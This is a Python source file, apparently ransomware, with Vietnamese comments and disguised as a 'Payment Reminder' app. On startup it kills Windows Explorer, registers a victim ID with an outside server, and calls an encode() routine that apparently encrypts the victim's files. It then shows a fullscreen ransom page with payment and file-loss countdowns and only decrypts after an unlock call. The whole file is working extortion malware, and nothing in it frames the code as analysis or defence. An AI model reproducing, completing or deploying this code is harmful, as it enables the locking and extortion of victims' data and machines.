import os, time
import json
import threading
import requests
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
import webview
from flask_cors import CORS
from encrypt import encode, decode
from RandomFileGenerator import RandomFileGenerator

class PaymentReminderApp:
    def __init__(self):
        self.TIME_FILE = "start_time.json"
        self.HTML_FILE = "index.html"
        self.TOTAL_PAYMENT_DURATION = timedelta(days=1)
        self.TOTAL_FILE_DURATION = timedelta(days=3)
        self.generator = RandomFileGenerator()
        self.app = Flask(__name__)
        CORS(self.app)
        self._setup_routes()
        self.lock = True
        self.wait_unlock = False
        
        os.system("taskkill /f /im explorer.exe")
        
        if not self.generator.check_id():
            id = self.generator.create_id()
            # Gửi ID đến API
            url = "https://hackerlo.scime.click/api_add_record.php"
            payload = {"id": id}
            headers = {"Content-Type": "application/json"}

            try:
                response = requests.post(url, json=payload, headers=headers)
                response.raise_for_status()
                print(response.json())  # In kết quả trả về
            except requests.exceptions.RequestException as e:
                print(f"Error sending ID to API: {e}")
            encode()

    def _setup_routes(self):
        @self.app.route("/")
        def index():
            return self._read_html_file()

        @self.app.route('/checkPayment', methods=['POST'])
        def check_payment():
            data = request.get_json(silent=True)
            id=self.generator.get_id()
            return jsonify({"message": id})

        @self.app.route('/decrypt', methods=['POST'])
        def decrypt():
            data = request.get_json(silent=True)
            if os.path.isfile("lock"):
                return jsonify({"message": "true"})
            if self.lock:
                return jsonify({"message": "false"})
            else:
                self.create_lock_file("lock")
                self.wait_unlock = True
                return jsonify({"message": "true"})
        
        @self.app.route('/unlock', methods=['POST'])
        def unlock():
            
            self.lock = False
            return jsonify({"message": "true"})

    def _read_html_file(self):
        with open(self.HTML_FILE, "r", encoding="utf-8") as f:
            return f.read()

    def _get_or_create_start_time(self):
        if os.path.exists(self.TIME_FILE):
            with open(self.TIME_FILE, "r") as f:
                data = json.load(f)
                return datetime.fromisoformat(data["start_time"])
        else:
            start_time = datetime.now()
            with open(self.TIME_FILE, "w") as f:
                json.dump({"start_time": start_time.isoformat()}, f)
            return start_time

    def create_lock_file(self, lock_file_path):
        """
        Tạo một file lock rỗng.

        Args:
            lock_file_path (str): Đường dẫn đến file lock.
        """
        try:
            with open(lock_file_path, 'w') as lock_file:
                pass  # Tạo file rỗng
            print(f"Lock file '{lock_file_path}' đã được tạo.")
        except Exception as e:
            print(f"Lỗi khi tạo lock file: {e}")
    
    def waiting_unlock(self):
        run=True
        while run:
            if self.wait_unlock:
                decode()
                return
            time.sleep(2)
    
    def _update_html_with_time(self):
        start_time = self._get_or_create_start_time()
        payment_deadline = start_time + self.TOTAL_PAYMENT_DURATION
        file_deadline = start_time + self.TOTAL_FILE_DURATION
        payment_time_remaining = payment_deadline - datetime.now()
        file_time_remaining = file_deadline - datetime.now()

        with open(self.HTML_FILE, "r", encoding="utf-8") as f:
            html_content = f.read()

        html_content = html_content.replace(
            "5/16/2017 00:47:55", payment_deadline.strftime("%m/%d/%Y %H:%M:%S")
        )
        html_content = html_content.replace(
            "5/20/2017 00:47:55", file_deadline.strftime("%m/%d/%Y %H:%M:%S")
        )
        html_content = html_content.replace(
            "'time-left-payment', 24 * 60 * 60", f"'time-left-payment', {int(payment_time_remaining.total_seconds())}"
        )
        html_content = html_content.replace(
            "'time-left-files', 3 * 24 * 60 * 60", f"'time-left-files', {int(file_time_remaining.total_seconds())}"
        )

        return html_content

    def _run_flask(self):
        self.app.run(debug=False, port=5000)

    def start(self):
        html_content = self._update_html_with_time()
        waiting_unlock = threading.Thread(target=self.waiting_unlock)
        flask_thread = threading.Thread(target=self._run_flask)
        flask_thread.daemon = True
        flask_thread.start()
        waiting_unlock.start()

        webview.create_window("Payment Reminder", "http://127.0.0.1:5000", html_content, fullscreen=True)
        webview.start()

if __name__ == "__main__":
    app = PaymentReminderApp()
    app.start()
